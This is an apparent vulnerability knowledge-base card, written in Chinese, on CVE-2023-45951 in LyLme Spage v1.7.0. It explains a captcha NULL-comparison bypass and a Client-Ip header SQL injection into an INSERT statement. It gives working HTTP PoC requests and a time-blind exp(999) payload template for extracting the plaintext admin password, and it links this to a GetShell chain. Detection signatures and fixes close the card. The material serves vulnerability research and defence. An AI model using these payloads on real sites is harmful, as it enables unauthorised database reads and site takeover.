---
id: web-generic-sqli-lylme-client-ip-insert-timeblind
title: LyLme Spage get_real_ip 信任 Client-Ip 头拼 INSERT：验证码 NULL 绕过 + exp(999) 时间盲注读后台明文口令（CVE-2023-45951）
type: scenario
domain: web
path: web/generic/sqli
technique: sqli-client-ip-insert-timeblind-exp-oracle
aliases:
- LyLme Spage SQL注入
- Client-Ip SQL注入
- get_real_ip SQL注入
- CVE-2023-45951
- 验证码 NULL 绕过
- INSERT 时间盲注 exp(999)
- lylme_spage 前台注入
tags:
- web
- php
- sqli
- insert
- time-blind
- http-header
- client-ip
- captcha-bypass
- code-audit
cve:
- CVE-2023-45951
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
affected_versions: v1.7.0
verification:
  verified_by: verifier-V642
  verified_at: '2026-11-13T02:25:53+08:00'
  notes: 已对照原文 12565 全文与 55 张图核对：get_real_ip 的 HTTP_CLIENT_IP 分支、INSERT 语句拼接 apply_mail、mysqli_query 布尔返回、exp(999) 求值顺序与盲注脚本、lylme_config 明文 admin_user/admin_pwd（截图 123456,admin）、CVE-2023-45951/v1.7.0 均一致；查重仅同项目不同漏洞（SSRF/XSS），非同链。修正一处：apply/index.php 外层有 if(isset($_REQUEST['authcode']))，绕过实际是 authcode= 空值且会话未生成验证码时 strtolower('')==NULL，原稿写成『不带 authcode 参数』有误，已改正文/触发条件/PoC（EXP 截图 31 确认发送 authcode={空}）。未实测目标环境。
---

## 一句话结论

LyLme Spage 的收录申请接口 `apply/index.php?submit=post` 用 `get_real_ip()` 取客户端 IP 并直接拼进 `INSERT INTO lylme_apply ...` 的 `apply_mail` 字段；`get_real_ip()` 优先读 `X-Forwarded-For`（逗号分割只取第一段，无法调用多参数函数），但其次的 `HTTP_CLIENT_IP` 分支整段可控，因此把注入放在 `Client-Ip` 请求头即可；配合「请求携带空值 `authcode` 参数（`authcode=`）且会话从未生成验证码时 `strtolower('') == NULL` 成立」的验证码绕过，以及 `if(cond, sleep(5)&exp(999), exp(999))` 的 INSERT 时间盲注 oracle（成功与否都不落库、只有条件为真才延时），可前台无认证读出 `lylme_config` 表中明文的后台账号密码。

## 原理

- 鉴权侧：后台以 `$islogin` 为唯一判据，`include/member.php` 中由 `admin_token` Cookie 的 `authcode` 解密结果与 `md5(admin_user.admin_pwd)` 松散比较（`==`）赋值，未发现可利用的绕过；真正的攻击面在前台无需认证的 `apply/index.php`。
- 验证码：`apply/index.php` 外层先 `if(isset($_REQUEST['authcode']))`（因此请求必须携带该参数，值可为空），随后比较 `strtolower($_REQUEST['authcode']) == $_SESSION['authcode']`，而 `$_SESSION['authcode']` 只在 `validatecode.php` 中被刷新。若请求携带空值参数（body 中 `authcode=`）、会话中也从未生成验证码，则左侧 `strtolower('')` 为空串、右侧 `$_SESSION['authcode']` 未定义取值为 `NULL`，PHP 松散比较 `'' == NULL` 为真，直接通过校验——不需要识别或复用验证码。
- 注入点：`apply()` 对 `name/url/icon/group_id` 做了 `str_tags(daddslashes(...))` 处理，但 `$userip = get_real_ip()` 未经任何转义就拼进单引号包裹的 SQL：
  `INSERT INTO lylme_apply (..., apply_mail, ...) VALUES (..., '".$userip."', ...)`。
- 头选择：`get_real_ip()` 先看 `X-Forwarded-For`，按逗号分割后只取 `trim($arr[0])`，逗号被吃掉导致无法调用 `if()`、`substring()` 等多参数函数，对 INSERT 注入基本无解；第二分支 `$_SERVER['HTTP_CLIENT_IP']` 整值返回，对应请求头 `Client-Ip` 完全可控且不受逗号限制，是实际注入通道。
- 为什么难利用：`$DB->query()` 直接 `mysqli_query($this->link,$q)`，返回布尔；未用 `multi_query`（不能堆叠）、未输出 `mysqli_error`（不能报错注入）；INSERT 的结果只分「插入成功」和「SQL 失败返回未知错误」。常用 `updatexml`/`extractvalue` 会在 `if` 之前求值报错，无法区分条件。
- 时间 oracle：`0'>if(cond,sleep(5),0)>'` 能让条件为真时延时，但无论真假 INSERT 都可能成功，按位猜解会向 `lylme_apply` 表灌入大量待审核数据。改进为 `0'>if(cond,sleep(5)&exp(999),exp(999))>'`：`if` 只对选中的分支求值，条件为真先 `sleep(5)` 再被 `exp(999)` 的 DOUBLE overflow 报错终止，条件为假立即报错终止；两种情况 INSERT 都失败不落库，仅用响应耗时区分真假，实现「无痕」时间盲注。
- 数据源：`include/common.php` 在每次请求时 `SELECT * FROM lylme_config` 并载入 `$conf`，该表以明文保存 `admin_user`/`admin_pwd`，是时间盲注的首选读取目标；拿到口令后即可登录后台，衔接后台更新接口的任意解压 GetShell。

## 触发条件

- 运行存在该代码的 LyLme Spage v1.7.0（原文 CVE 申请与 NVD 描述标注 v1.7.0）。
- 前台收录申请功能可访问：`/apply/index.php?submit=post`，且站点未关闭收录（`$conf['apply'] != 2`）。
- PHP + MySQL 环境；`allow_url_fopen` 与注入利用无关，但数据库用户可读 `lylme_config`。
- 注入头需能透传到 PHP：直连目标时 `Client-Ip` 任意可控；若前面有反向代理，需确认该头未被丢弃或改写。
- 每次请求的 `url` 参数必须唯一（否则命中 `apply_url LIKE '$url%'` 查重返回「链接已存在」），在 URL 后追加随机串即可。

## 利用步骤

1. 先探测验证码绕过：直接 POST 提交并携带空值 `authcode` 参数（`authcode=`）、不带会话验证码，且不预先访问 `validatecode.php` 生成会话验证码；若返回业务 JSON（而非「验证码错误」）即通过。
2. 在 `Client-Ip` 头放单引号观察报错/正常差异，再放 `0'>if(1,sleep(5)&exp(999),exp(999))>'`，确认响应约 5 秒延迟。
3. 用 `ord(substring((<子查询>),<位置>,1))=<猜测值>` 作为条件逐字符猜解；目标子查询如 `select group_concat(v) from lylme_config where k like 'admin%'`。
4. 每轮更换 `url` 参数保持唯一；条件为假时立即报错、为真时延时，据耗时收集字符，拼出 `admin_user,admin_pwd`。
5. 用得到的后台明文口令登录 `/admin/login.php`，取得 `admin_token`，衔接 `admin/ajax_link.php?submit=update` 的更新解压接口 GetShell（见关联卡）。

## PoC

验证验证码 NULL 绕过 + 时间盲注（`authcode=` 空值 + 会话未生成验证码，`url` 每次随机）：

```http
POST /apply/index.php?submit=post HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

url=http://example.com<random>&name=test&group_id=1&icon=&authcode=
```

```http
POST /apply/index.php?submit=post HTTP/1.1
Host: target
Client-Ip: 0'>if(ord(substring(user(),1,1))=114,sleep(5)&exp(999),exp(999))>'
Content-Type: application/x-www-form-urlencoded

url=http://example.com<random>&name=test&group_id=1&icon=&authcode=
```

条件为真时响应延迟约 5 秒；为假时立即返回「未知错误」。逐字符提取后台口令：

```
Client-Ip: 0'>if(ord(substring((select group_concat(v) from lylme_config where k like 'admin%'),<i>,1))=<c>,sleep(5)&exp(999),exp(999))>'
```

原文附带 Python 脚本：先猜 `length()` 再逐字符猜 `ord(substring(...))`，字符集为大小写字母+数字+符号，约 1～2 分钟可得完整 `admin_pwd,admin_user` 串（实测 `123456,admin`）。

## 变体与关联

- 变体：无 `Client-Ip` 分支时，若 `X-Forwarded-For` 的解析逻辑保留整值（如只 trim 不按逗号切分），同样可作为注入通道；本文因逗号切分而不可用。
- 变体：`exp(999)` 换成其它所选分支才求值的报错原语（如 `GTID_SUBSET`、类型转换错误）时需重新验证求值顺序，`updatexml`/`extractvalue` 会在 `if` 前求值，不适用于本场景。
- 变体：同一 `INSERT` 盲注结构适用于任何「取真实 IP 落库」的申请/评论/日志功能，只要能控制单个请求头且 INSERT 语句单引号包裹。
- 关联：[[web-generic-sqli-http-header-injection]]——请求头作为注入点的通用手法；本卡是 `Client-Ip` + INSERT 时间盲注的具体完整链。
- 关联：[[web-generic-sqli-insert-visible-field-function-readback]]——另一种 INSERT 注入回读思路（写入可见字段），本场景无回显点故用时间 oracle。
- 关联：[[web-generic-file-upload-lylme-update-zip-extract-rce]]、[[web-generic-file-upload-lylme-update-data-wrapper-zip-rce]]——拿到后台口令后的后续 GetShell 链。

## 检测与防御

- 修复：所有 SQL 使用参数化查询/预编译，IP 值与其它参数同等对待，不因来自请求头而信任。
- 修复：`get_real_ip()` 对最终 IP 做 `filter_var($ip, FILTER_VALIDATE_IP)` 校验（官方 PR 即采用该修复），非法则返回空串；`X-Forwarded-For` 只信任可信代理链。
- 修复：验证码校验改为 `isset($_SESSION['authcode']) && is_string($_REQUEST['authcode']) && strtolower($_REQUEST['authcode']) === $_SESSION['authcode']`，避免 NULL 比较；验证码一次性使用。
- 防御：后台口令等敏感配置不明文存库，改用 `password_hash` 存储校验值。
- 检测：请求头 `Client-Ip`/`X-Forwarded-For` 中出现单引号、`if(`、`sleep(`、`exp(`、`substring(` 等特征；申请接口响应时间呈 5 秒级双峰分布；同一来源对 `apply/index.php` 高频提交且 `url` 参数带随机后缀；`lylme_apply` 无新增记录但请求量异常。
